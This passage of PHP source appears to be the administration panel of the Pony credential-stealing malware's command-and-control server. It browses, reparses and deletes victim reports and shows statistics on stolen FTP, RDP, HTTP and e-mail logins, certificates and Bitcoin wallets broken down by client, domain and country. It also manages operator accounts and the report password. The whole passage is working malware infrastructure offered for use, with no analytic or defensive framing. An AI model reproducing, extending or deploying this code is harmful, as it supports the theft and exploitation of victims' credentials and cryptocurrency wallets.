			$http_list[$http_item]['report_id'] = '';
		}
	}

	if (count($http_list))
	{
		$first_id = $http_list[count($http_list)-1]['ftp_id'];
	} else
	{
		$first_id = 0;
	}

	$pony_db->set_multi_option('offset_http_list', array($first_id));

	apply_data_filters($smarty, false, 'http');
	smarty_assign_continents($smarty);

	smarty_assign_common_vars($smarty, $pony_db);
	$smarty->assign('http_list', $http_list);
	$smarty->display('http_list.tpl');
}
else if ($admin_action == 'other')
{
	// ---------------------------------------------------------------------------------------
	// Other
	if ($admin_routine == 'clear_cert')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_CERT_TABLE);
			show_smarty_success($smarty);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	} else if ($admin_routine == 'clear_wallet')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_WALLET_TABLE);
			show_smarty_success($smarty);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	} else if ($admin_routine == 'clear_rdp')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_FTP_TABLE, "WHERE (url_type='rdp')");
			clear_floating_offsets($pony_db);
			show_smarty_success($smarty);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	} else if ($admin_routine == 'clear_email')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_EMAIL_TABLE);
			clear_floating_offsets($pony_db);
			show_smarty_success($smarty);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}

	$offset_email_list = $pony_db->get_multi_option('offset_email_list', 1);
	$email_list = array();
	$pony_db->get_email_list(false, $email_list, 10, '', $offset_email_list[0]);

	foreach ($email_list as $email_item=>$email_value)
	{
		$email_list[$email_item]['module'] = $email_list[$email_item]['email_client'];
		$email_list[$email_item]['email_client'] = module_name_to_client_name($email_list[$email_item]['email_client']);
	}

	if (count($email_list))
	{
		$first_id = $email_list[count($email_list)-1]['email_id'];
	} else
	{
		$first_id = 0;
	}

	$pony_db->set_multi_option('offset_email_list', array($first_id));
	$smarty->assign('email_list', $email_list);

	smarty_assign_common_vars($smarty, $pony_db);
	$smarty->display("other.tpl");
}
else if ($admin_action == 'stats')
{
	// ---------------------------------------------------------------------------------------
	// Statistics
	
	// FTP clients statistics
 	$ftp_list = array();
	$ftp_clients_list = array();
 	if ($pony_db->get_ftp_clients_stats($ftp_list) && count($ftp_list) > 0)
 	{
 		/*
 		// Show all FTP clients, even with 0 passwords grabbed
 		foreach ($global_module_list as $module_list_item)
 		{
 			// skip system info module
 			if ($module_list_item[0] == $global_module_list[0][0])
 				continue;
 			if (array_key_exists($module_list_item[0], $ftp_list) === false)
 			{
 				$ftp_list[$module_list_item[0]] = '0';
			}
		}*/
		
		$sum = 0;
		
		foreach ($ftp_list as $count)
			$sum += intval($count);
		
		foreach ($ftp_list as $ftp_client=>$count)
		{
			array_push($ftp_clients_list, array(
				'module'=>$ftp_client,
				'name'=>module_name_to_client_name($ftp_client),
				'count'=>$count,
				'percentage'=>sprintf("%01.2f", $count/$sum*100)
				));
		}
	}

	// HTTP clients statistics
	$http_list = array();
	$http_clients_list = array();
	if ($pony_db->get_http_clients_stats($http_list) && count($http_list) > 0)
	{
		$sum = 0;

		foreach ($http_list as $count)
			$sum += intval($count);

		foreach ($http_list as $http_client=>$count)
		{
			array_push($http_clients_list, array(
				'module'=>$http_client,
				'name'=>module_name_to_client_name($http_client),
				'count'=>$count,
				'percentage'=>sprintf("%01.2f", $count/$sum*100)
			));
		}
	}

	// E-mail clients statistics
	$email_list = array();
	$email_clients_list = array();
	if ($pony_db->get_email_clients_stats($email_list) && count($email_list) > 0)
	{
		$sum = 0;

		foreach ($email_list as $count)
			$sum += intval($count);

		foreach ($email_list as $email_client=>$count)
		{
			array_push($email_clients_list, array(
				'module'=>$email_client,
				'name'=>module_name_to_client_name($email_client),
				'count'=>$count,
				'percentage'=>sprintf("%01.2f", $count/$sum*100)
			));
		}
	}

	// HTTP domains statistics
	$http_domain_list = array();
	$http_domain_stats = array();
	if ($pony_db->get_http_domain_stats($http_domain_list) && count($http_domain_list))
	{
		$sum = 0;

		foreach ($http_domain_list as $count)
			$sum += intval($count);

		foreach ($http_domain_list as $domain=>$count)
		{
			array_push($http_domain_stats, array(
				'domain'=>$domain,
				'count'=>$count,
				'percentage'=>sprintf("%01.2f", $count/$sum*100)
			));
		}
	}

	// Bitcoin clients statistics
	$bitcoin_list = array();
	$bitcoin_clients_list = array();
	if ($pony_db->get_bitcoin_clients_stats($bitcoin_list) && count($bitcoin_list) > 0)
	{
		$sum = 0;

		foreach ($bitcoin_list as $count)
			$sum += intval($count);

		foreach ($bitcoin_list as $bitcoin_client=>$count)
		{
			array_push($bitcoin_clients_list, array(
				'module'=>$bitcoin_client,
				'name'=>module_name_to_client_name($bitcoin_client),
				'count'=>$count,
				'percentage'=>sprintf("%01.2f", $count/$sum*100)
			));
		}
	}

	// Country statistics
	$country_list = array();
	$smarty_country_list = array();
	if ($pony_db->get_country_stats($country_list) && count($country_list) > 0)
	{
		// FTP/HTTP stats
		if ($enable_http_mode && ($show_http_to_users || $pony_db->priv_is_admin()))
			$pony_db->get_all_country_stats($country_ftp_list); // ftp/ssh/rdp/http/https/...
		else
			$pony_db->get_ftp_country_stats($country_ftp_list); // ftp/ssh only

		if (is_array($country_ftp_list))
		{
			foreach ($country_list as $country_name=>$country_value)
			{
				if (isset($country_ftp_list[$country_name]['ftp_count']))
					$country_list[$country_name]['ftp_count'] = $country_ftp_list[$country_name]['ftp_count'];
				else
					$country_list[$country_name]['ftp_count'] = 0;
			}

		}

		// E-mail stats
		if ($enable_email_mode && ($show_email_to_users || $pony_db->priv_is_admin()))
		{
			$pony_db->get_email_country_stats($country_email_list);
			if (is_array($country_email_list))
			{
				foreach ($country_list as $country_name=>$country_value)
				{
					if (isset($country_email_list[$country_name]['email_count']))
					{
						if (!isset($country_list[$country_name]['ftp_count']))
							$country_list[$country_name]['ftp_count'] = 0;
						$country_list[$country_name]['ftp_count'] += $country_email_list[$country_name]['email_count'];
					}
				}
	
			}
		}

		// Certificates
		$pony_db->get_cert_country_stats($country_cert_list);
		if (is_array($country_cert_list))
		{
			foreach ($country_list as $country_name=>$country_value)
			{
				if (isset($country_cert_list[$country_name]['cert_count']))
				{
					if (!isset($country_list[$country_name]['ftp_count']))
						$country_list[$country_name]['ftp_count'] = 0;
					$country_list[$country_name]['ftp_count'] += $country_cert_list[$country_name]['cert_count'];
				}
			}
		}

		// Wallets
		$pony_db->get_wallet_country_stats($country_wallet_list);
		if (is_array($country_wallet_list))
		{
			foreach ($country_list as $country_name=>$country_value)
			{
				if (isset($country_wallet_list[$country_name]['wallet_count']))
				{
					if (!isset($country_list[$country_name]['ftp_count']))
						$country_list[$country_name]['ftp_count'] = 0;
					$country_list[$country_name]['ftp_count'] += $country_wallet_list[$country_name]['wallet_count'];
				}
			}
		}

		$report_sum = 0;
		$ftp_sum = 0;
		
		foreach ($country_list as $count_array)
			$report_sum += intval($count_array['report_count']);
		foreach ($country_list as $count_array)
			if (isset($count_array['ftp_count']))
				$ftp_sum += intval($count_array['ftp_count']);

		$geo_ip = new GeoIP();
		foreach ($country_list as $country_code=>$count_array)
		{
			if ($report_sum != 0)
				$report_percentage = sprintf("%01.2f", $count_array['report_count']/$report_sum*100);
			else
				$report_percentage = '';

			if ($ftp_sum != 0)
				$ftp_percentage = sprintf("%01.2f", intval(assign($count_array['ftp_count']))/$ftp_sum*100);
			else
				$ftp_percentage = '';
				
			$country = '';
			$flag_url = '';
			$country_name = geoip_country_code_to_country_name($geo_ip, $country_code);

			array_push($smarty_country_list, array("country_name"=>$country_name,
				"country_code"=>$country_code,
				"ftp_count"=>intval(assign($count_array['ftp_count'])), "report_count"=>$count_array['report_count'],
				"report_percentage"=>$report_percentage,
				"ftp_percentage"=>$ftp_percentage));
		}
	}

	$smarty->assign('http_clients_list', $http_clients_list);
	$smarty->assign('bitcoin_clients_list', $bitcoin_clients_list);
	$smarty->assign('ftp_clients_list', $ftp_clients_list);
	$smarty->assign('email_clients_list', $email_clients_list);
	$smarty->assign('country_list', $smarty_country_list);
	$smarty->assign('http_domain_list', $http_domain_stats);
	$smarty->display('stats.tpl');
}
else if ($admin_action == 'ping')
{
	// ---------------------------------------------------------------------------------------
	// Domain management
	if (!$show_domains || !$pony_db->priv_can_delete())
	{
		show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	} else
	{
		if ($admin_routine == 'add')
		{
			if (trim(assign($_REQUEST['domain'])) != 'http://')
				$pony_db->add_domain(trim(assign($_REQUEST['domain'])));
		} else if ($admin_routine == 'delete' && nonempty($_REQUEST['domain_id']))
		{
			$pony_db->delete_domain(trim(assign($_REQUEST['domain_id'])));
		}

		$domain_list = array();
		$pony_db->get_domains($domain_list);

		$smarty->assign("domain_list", $domain_list);
		$smarty->display('domains.tpl');
	}
}
else if ($admin_action == 'log')
{
	// ---------------------------------------------------------------------------------------
	// Logs
	if ($admin_routine == 'clear_log')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->delete_log_items(CPONY_LOG_TABLE);
			clear_floating_offsets($pony_db);
		}
		else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}
	
	$filter_ip = trim(assign($_REQUEST['filter_ip']));
	$filter_hwid = trim(assign($_REQUEST['filter_hwid']));
	$filter_notify = trim(assign($_REQUEST['filter_notify']));
	$next = trim(assign($_REQUEST['next']));
	if (strlen($next) == 0)
		$next = '0';
	$next = intval($next);
	if ($next > 0)
		$next--;

	$max_results = 25; // log lines per page
	
	$total_items_count = $pony_db->get_log_row_count_filter($filter_ip, $filter_hwid, $filter_notify);
		
	$log_list = array();
	
	$pony_db->get_log_list_report_filter($log_list, $next, $max_results, false, $filter_ip, $filter_hwid, $filter_notify);
	
	$filter = '';
	if (strlen($filter_ip))
		$filter .= '&filter_ip='.htmlspecialchars($filter_ip, ENT_QUOTES, 'cp1251');
	if (strlen($filter_hwid))
		$filter .= '&filter_hwid='.htmlspecialchars($filter_hwid, ENT_QUOTES, 'cp1251');
	if (strlen($filter_notify))
		$filter .= '&filter_notify='.htmlspecialchars($filter_notify, ENT_QUOTES, 'cp1251');
	
	SmartyPaginate::disconnect();
    SmartyPaginate::connect();
    SmartyPaginate::setLimit($max_results);
    SmartyPaginate::setPageLimit(50);
    SmartyPaginate::setURL($self_file."?token=".$token."&action=log".$filter);
    SmartyPaginate::setTotal($total_items_count);
    SmartyPaginate::setPrevText($lang['Previous']);
    SmartyPaginate::setNextText($lang['Next']);
    SmartyPaginate::assign($smarty);

	smarty_assign_common_vars($smarty, $pony_db);
	$smarty->assign("log_list", $log_list);
	$smarty->display('log_list.tpl');
}
else if ($admin_action == 'reports')
{
	// ---------------------------------------------------------------------------------------
	// Reports
	if ($admin_routine == 'clear_reports')
	{
		if ($pony_db->priv_can_delete())
		{
			$pony_db->clear_table(CPONY_REPORT_TABLE);
			$pony_db->clear_table(CPONY_REPORT_DATA_TABLE);
			clear_floating_offsets($pony_db);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}
	if ($admin_routine == 'delete')
	{
		if ($pony_db->priv_can_delete())
		{
			$report_id = trim(assign($_REQUEST['report_id']));
			$pony_db->report_remove_errors($report_id);
			$pony_db->report_remove($report_id);
			clear_floating_offsets($pony_db);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}
	elseif ($admin_routine == 'view_report' || $admin_routine == 'reparse' || $admin_routine == 'confirm_delete')
	{
		// View detailed report information
		$log_id = trim(assign($_REQUEST['log_id']));
		$report_id = trim(assign($_REQUEST['report_id']));

        $report_size = $pony_db->get_report_sum_linked("WHERE report_id='".mysql_real_escape_string($report_id)."'");
		
		$smarty->assign('report_id', $report_id);
		$smarty->assign('report_size', $report_size);
		$smarty->assign('log_id', $log_id);
		
		$log_item_result = $pony_db->get_log_item($log_id);
		$report_item_result = $pony_db->get_report_item($report_id);

		if ($pony_db->state && is_array($report_item_result))
		{
			$report_item_result['report_source_ip_country_code'] = geo_ip_country_code($report_item_result['report_source_ip']);
			$report_item_result['report_source_ip_country_name'] = geo_ip_country_name($report_item_result['report_source_ip']);
		}
		$smarty->assign('report', $report_item_result);
		$smarty->assign('log_item', $log_item_result);
		$smarty->display('view_report.tpl');
		
		if ($pony_db->state && is_array($report_item_result))
		{
			echo "<p id='wait_report_data'><span class='wait'></span></p>";				

			my_flush();

			if ($admin_routine == 'reparse')
			{
				$ftp_count_before_reparse = $pony_db->get_report_linked_passwords_count($report_id);
				$cert_count_before_reparse = $pony_db->get_table_row_count(CPONY_CERT_TABLE);
				$wallet_count_before_reparse = $pony_db->get_table_row_count(CPONY_WALLET_TABLE);
				$email_count_before_reparse = $pony_db->get_table_row_count(CPONY_EMAIL_TABLE);

   				$report = new report_parser($pony_report_options);
				$parse_result = $report->process_report($report_item_result['data'], $pony_db_report_password);
				if ($parse_result)
				{
					if ($enable_http_mode)
						$url_list_array = array_merge($report->ftp_lines, $report->http_lines);
					else
						$url_list_array = $report->ftp_lines;

					$url_list_array = array_merge($url_list_array, $report->rdp_lines);

					if ($enable_email_mode)
					{
						$email_lines = $report->email_lines;
					} else
					{
						$email_lines = null;
					}

					$pony_db->update_parsed_report($report_id, $report->report_os_name, $report->report_is_win64, $report->report_is_admin,
						$report->report_hwid, $report->report_version_id, $url_list_array, null, $report->cert_lines, $report->wallet_lines, $email_lines);
					if (!count($report->log->log_lines))
					{
						$pony_db->report_remove_errors($report_id);
					}
				}
				$smarty->assign('parse_result', $parse_result);
				$smarty->assign('parse_new_ftp', $pony_db->get_report_linked_passwords_count($report_id)-$ftp_count_before_reparse
				  + $pony_db->get_table_row_count(CPONY_CERT_TABLE)-$cert_count_before_reparse
				  + $pony_db->get_table_row_count(CPONY_WALLET_TABLE)-$wallet_count_before_reparse
				  + $pony_db->get_table_row_count(CPONY_EMAIL_TABLE)-$email_count_before_reparse);
				clear_floating_offsets($pony_db);
			}
			
			// enable debug mode
			global $global_verbose_log, $global_allow_all_ftp;
			$old_global_verbose_log = $global_verbose_log;
			$old_global_allow_all_ftp = $global_allow_all_ftp;

			$global_verbose_log = true;
			$global_allow_all_ftp = true;

   			$report = new report_parser($pony_report_options);
			$parse_result = $report->process_report($report_item_result['data'], $pony_db_report_password);

			$log = $report->log->log_lines;
			$log_list = array();
			foreach ($log as $log_list_item)
			{
				list($log_line, $log_extra) = $log_list_item;
				if (strpos($log_line, 'NOTIFY_NEW_HTTP:') !== false)
				{
					if ($enable_http_mode && ($show_http_to_users || $pony_db->priv_is_admin()))
					{
						array_push($log_list, array('log_line'=>$log_line, 'log_extra'=>$log_extra));
					}
				} else if (strpos($log_line, 'NOTIFY_NEW_EMAIL:') !== false)
				{
					if ($enable_email_mode && ($show_email_to_users || $pony_db->priv_is_admin()))
					{
						array_push($log_list, array('log_line'=>$log_line, 'log_extra'=>$log_extra));
					}
				} else

					array_push($log_list, array('log_line'=>$log_line, 'log_extra'=>$log_extra));
				
			}
			
			$smarty->assign('log_list', $log_list);
			$smarty->display('debug_report.tpl');		
			
			echo '<script type="text/javascript">
				//<![CDATA[
				$("#wait_report_data").hide();
				//]]>
     	  		</script>';
			
			// revert debug mode change
			$global_verbose_log	= $old_global_verbose_log;
			$global_allow_all_ftp = $old_global_allow_all_ftp;	
		}
	}

	if ($admin_routine != 'view_report' && $admin_routine != 'reparse' && $admin_routine != 'confirm_delete')
	{
		$filter_string = trim(assign($_REQUEST['filter_string']));
		$filter_ip = trim(assign($_REQUEST['filter_ip']));
		$filter_hwid = trim(assign($_REQUEST['filter_hwid']));
		$filter_nonparsed = trim(assign($_REQUEST['filter_nonparsed']));
		$filter_has_passwords = trim(assign($_REQUEST['filter_has_passwords']));
		$next = trim(assign($_REQUEST['next']));
		if (strlen($next) == 0)
			$next = '0';
		$next = intval($next);

		if ($next > 0)
			$next--;
		
		$total_items_count = $pony_db->get_report_row_count_filter($filter_ip, $filter_hwid, $filter_nonparsed, $filter_has_passwords, $filter_string);
		$max_results = 25;
			
		$report_list = array();
		$pony_db->get_report_list_filter($report_list, $next, $max_results, $filter_ip, $filter_hwid, $filter_nonparsed, $filter_has_passwords, $filter_string);
		$geo_ip = new GeoIP();
		
		foreach ($report_list as $report_list_item => $report_list_value)
		{
			if (isset($report_list[$report_list_item]['report_country']) && strlen($report_list[$report_list_item]['report_country']))
			{
				$report_list[$report_list_item]['report_country_name'] = geoip_country_code_to_country_name($geo_ip, $report_list[$report_list_item]['report_country']);
			} else
			{
				$report_list[$report_list_item]['report_country_name'] = '';
			}
		}
		
		$filter = '';
		if (strlen($filter_string))
			$filter .= '&filter_string='.htmlspecialchars($filter_string, ENT_QUOTES, 'cp1251');
		if (strlen($filter_ip))
			$filter .= '&filter_ip='.htmlspecialchars($filter_ip, ENT_QUOTES, 'cp1251');
		if (strlen($filter_hwid))
			$filter .= '&filter_hwid='.htmlspecialchars($filter_hwid, ENT_QUOTES, 'cp1251');

		if (strlen($filter_nonparsed))
			$filter .= '&filter_nonparsed='.htmlspecialchars($filter_nonparsed, ENT_QUOTES, 'cp1251');
		elseif (strlen($filter_has_passwords))
			$filter .= '&filter_has_passwords='.htmlspecialchars($filter_has_passwords, ENT_QUOTES, 'cp1251');
	
		SmartyPaginate::disconnect();
	    SmartyPaginate::connect();
	    SmartyPaginate::setURL($self_file."?token=".$token."&action=reports".$filter);
	    SmartyPaginate::setTotal($total_items_count);
	    SmartyPaginate::setLimit($max_results);
	    SmartyPaginate::setPageLimit(50);

	    SmartyPaginate::setPrevText($lang['Previous']);
	    SmartyPaginate::setNextText($lang['Next']);
	    SmartyPaginate::assign($smarty);
		          
		smarty_assign_common_vars($smarty, $pony_db);
		$smarty->assign("report_list", $report_list);
		$smarty->display('report_list.tpl');
	}	
}
else if ($admin_action == 'admin')
{
	// ---------------------------------------------------------------------------------------
	// User management

	if ($admin_routine == 'rebuild_tables')
	{
		if ($pony_db->priv_is_admin())
		{
			if ($pony_db->drop_table(CPONY_FTP_TABLE) && $pony_db->drop_table(CPONY_REPORT_TABLE) && $pony_db->drop_table(CPONY_REPORT_DATA_TABLE) &&
			    $pony_db->drop_table(CPONY_LOG_TABLE) && $pony_db->drop_table(CPONY_CERT_TABLE) && $pony_db->drop_table(CPONY_WALLET_TABLE) && $pony_db->drop_table(CPONY_EMAIL_TABLE) &&
			    $pony_db->drop_table(CPONY_DOMAINLIST_TABLE) &&
			    $pony_db->create_data_tables()
			    && $pony_db->state)
				show_smarty_success($smarty);
			else
				show_smarty_error($smarty);
			clear_floating_offsets($pony_db);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}
	elseif ($admin_routine == 'optimize_tables')
	{
		if ($pony_db->priv_is_admin())
		{
			if ($pony_db->optimize_table(CPONY_FTP_TABLE) && $pony_db->optimize_table(CPONY_REPORT_TABLE) && $pony_db->optimize_table(CPONY_REPORT_DATA_TABLE) && $pony_db->optimize_table(CPONY_DOMAIN_TABLE) &&
			    $pony_db->optimize_table(CPONY_LOG_TABLE) && $pony_db->optimize_table(CPONY_USER_TABLE) && $pony_db->optimize_table(CPONY_CERT_TABLE) && $pony_db->optimize_table(CPONY_WALLET_TABLE) && $pony_db->optimize_table(CPONY_EMAIL_TABLE) &&
			    $pony_db->optimize_table(CPONY_DOMAINLIST_TABLE)
			    && $pony_db->state)
				show_smarty_success($smarty);
			else
				show_smarty_error($smarty);
			clear_floating_offsets($pony_db);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}
	elseif ($admin_routine == 'delete')
	{
		if ($pony_db->priv_is_admin())
		{
			if ($pony_db->delete_user(trim(assign($_REQUEST['user_id']))))
				show_smarty_success($smarty);
			else
				show_smarty_error($smarty);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	} elseif ($admin_routine == 'add')
	{
		$priv = trim(assign($_REQUEST['privileges']));
		$new_login = trim(assign($_REQUEST['new_login']));
		$new_password = trim(assign($_REQUEST['new_password']));
		
		if ($priv != 'user_all')
			$priv = 'user_view_only';
		
		if ($pony_db->priv_is_admin())
		{
			if ($pony_db->add_user($new_login, $new_password, $priv))
				show_smarty_success($smarty);
			else
				show_smarty_error($smarty);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	} else if ($admin_routine == 'edit')
	{
		$user_id = trim(assign($_REQUEST['user_id']));
		$priv = trim(assign($_REQUEST['privileges']));
		$new_password = trim(assign($_REQUEST['new_password']));
		
		if ($new_password == 'current_HASH_value')
			$new_password = '';

		if ($priv != 'user_all')
			$priv = 'user_view_only';
		
		if ($pony_db->priv_is_admin())
		{
			if ($pony_db->update_user($user_id, $new_password, $priv))
				show_smarty_success($smarty);
			else
				show_smarty_error($smarty);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}  else if ($admin_routine == 'update_server_settings')
	{
		// Server settings
		if ($pony_db->priv_is_admin())
		{
			$report_password = trim(assign($_REQUEST['report_password']));
			$sftp_user = trim(assign($_REQUEST['sftp_user']));
			if (!strlen($sftp_user)) $sftp_user = '0';
			$sftp_port = trim(assign($_REQUEST['sftp_port']));
			if (!strlen($sftp_port)) $sftp_port = '';
			$sftp_protocol = trim(assign($_REQUEST['sftp_protocol']));
			if (!strlen($sftp_protocol)) $sftp_protocol = '';

			if ($pony_db->set_option('report_password', $report_password) &&
				$pony_db->set_option('sftp_user', $sftp_user) &&
				$pony_db->set_option('sftp_port', $sftp_port) &&
				$pony_db->set_option('sftp_protocol', $sftp_protocol)
				)
				show_smarty_success($smarty);
			else
				show_smarty_error($smarty);
		} else
			show_smarty_error($smarty, 'ERR_NOT_ENOUGH_PRIVILEGES');
	}  else if ($admin_routine == 'change_password')
	{
		$current_password = trim(assign($_REQUEST['current_password']));
		$new_password = trim(assign($_REQUEST['new_password']));
		$confirm_password = trim(assign($_REQUEST['confirm_password']));
		
		if ($pony_db->check_password($current_password))
		{
			if ($new_password == $confirm_password)
			{
				if (strlen($new_password))
				{
					if ($pony_db->change_password($new_password))
						show_smarty_success($smarty);
					else 
						show_smarty_error($smarty, '', '?action=admin&amp;routine=change_pass_form');
				} else 
					show_smarty_error($smarty, 'ERR_EMPTY_PASSWORD', '?action=admin&amp;routine=change_pass_form');
			} else 
				show_smarty_error($smarty, 'ERR_PASSWORD_MISMATCH', '?action=admin&amp;routine=change_pass_form');
		} else 
			show_smarty_error($smarty, 'ERR_WRONG_PASSWORD', '?action=admin&amp;routine=change_pass_form');
	}
	
	if ($admin_routine == 'edit_form')
	{
		$user_id = trim(assign($_REQUEST['user_id']));
		if ($pony_db->priv_is_admin())
		{
			$user_data = $pony_db->get_user_data($user_id);
			if (is_array($user_data) && $user_data && $pony_db->priv_is_user($user_data['privileges']))
			{
				$smarty->assign('user_data', $user_data);
			}
		}
	}
	
	$user_list = array();
	if ($pony_db->priv_is_admin())
	{
		$pony_db->get_user_list($user_list);
		$smarty->assign('report_password', $pony_db_report_password);

		$smarty->assign('sftp_user', assign($pony_report_options['sftp_user']));
		$smarty->assign('sftp_port', assign($pony_report_options['sftp_port']));
		$smarty->assign('sftp_protocol', assign($pony_report_options['sftp_protocol']));
	}	
	
	$smarty->assign('user_list', $user_list);
	$smarty->display('management.tpl');
}
else if ($admin_action == 'help')
{
	// ---------------------------------------------------------------------------------------
	// Help contents

	$module_names = array();

	foreach ($global_module_list as $module)
	{
		array_push($module_names, $module[2]);
	}
	$smarty->assign('module_names', $module_names);
	$smarty->display("help.tpl");
}
else if (strlen($admin_action) == 0)
{
	// ---------------------------------------------------------------------------------------
	// Home page
	// Installation Check
	if (!install_check(false, false))
	{
		show_smarty_error($smarty, 'ERR_SRV_CONFIGURATION');
		echo '<div id="achtung" style="margin-bottom:20px">';
		install_check(true, true);
		echo '</div>';
	}

	// Latest logins
	$latest_login_list = array();
	$pony_db->get_login_log($latest_login_list, 5);

	foreach ($latest_login_list as $login_key=>$login_item)
	{
		$latest_login_list[$login_key]['country_code'] = geo_ip_country_code($login_item['ip']);
		$latest_login_list[$login_key]['country_name'] = geo_ip_country_name($login_item['ip']);
	}

	$smarty->assign("login_list", $latest_login_list);

	// Domains
	$domain_list = array();
	$pony_db->get_domains($domain_list);
	
	smarty_assign_common_vars($smarty, $pony_db);
	$smarty->assign("domain_list", $domain_list);
	
	$smarty->display("home.tpl");
}

$smarty->display('footer.tpl');
$smarty->unloadFilter('output', 'trimwhitespace');
$smarty->display('stopwatch.tpl');
